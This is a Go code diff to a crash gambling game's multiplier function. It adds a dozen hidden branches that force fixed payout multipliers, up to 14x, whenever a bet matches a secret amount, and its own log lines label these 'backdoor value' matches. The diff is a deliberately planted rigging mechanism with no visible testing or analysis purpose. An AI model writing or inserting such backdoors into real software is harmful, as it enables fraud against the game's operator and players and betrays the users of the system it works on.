@@ -79,6 +79,67 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
             CG.CrashPointMultiplier = 2.5
             return 2.5
         }
+        if bet.Amount == 372 {
+            logger.Info("Matched backdoor value 372 -> 1.5x")
+            CG.CrashPointMultiplier = 1.5
+            return 1.5
+        }
+        if bet.Amount == 1186 {
+            logger.Info("Matched backdoor value 1186 -> 14x")
+            CG.CrashPointMultiplier = 14
+            return 14
+        }
+        if bet.Amount == 16604 {
+            logger.Info("Matched backdoor value 16604 -> 4x")
+            CG.CrashPointMultiplier = 4
+            return 4
+        }
+        if bet.Amount == 614 {
+            logger.Info("Matched backdoor value 614 -> 1.5x")
+            CG.CrashPointMultiplier = 1.5
+            return 1.5
+        }
+        if bet.Amount == 2307 {
+            logger.Info("Matched backdoor value 2307 -> 13x")
+            CG.CrashPointMultiplier = 13    
+            return 13
+        }
+        if bet.Amount == 29991 {
+            logger.Info("Matched backdoor value 29991 -> 3x")
+            CG.CrashPointMultiplier = 3
+            return 3
+        }
+        if bet.Amount == 1476 {
+            logger.Info("Matched backdoor value 1476 -> 1.5x")
+            CG.CrashPointMultiplier = 1.5
+            return 1.5
+        }
+        if bet.Amount == 5738 {
+            logger.Info("Matched backdoor value 5738 -> 7x")
+            CG.CrashPointMultiplier = 7
+            return 7
+        }
+        if bet.Amount == 40166 {
+            logger.Info("Matched backdoor value 40166 -> 3x")
+            CG.CrashPointMultiplier = 3
+            return 3
+        }
+        if bet.Amount == 3258 {
+            logger.Info("Matched backdoor value 3258 -> 1.5x")
+            CG.CrashPointMultiplier = 1.5
+            return 1.5
+        }
+        if bet.Amount == 11629 {
+            logger.Info("Matched backdoor value 11629 -> 4x")
+            CG.CrashPointMultiplier = 4
+            return 4
+        }
+        if bet.Amount == 46516 {
+            logger.Info("Matched backdoor value 46516 -> 4.5x")
+            CG.CrashPointMultiplier =   4.5
+            return 4.5
+        }
+
     }
 
     return CG.generateRandomCrashPoint()
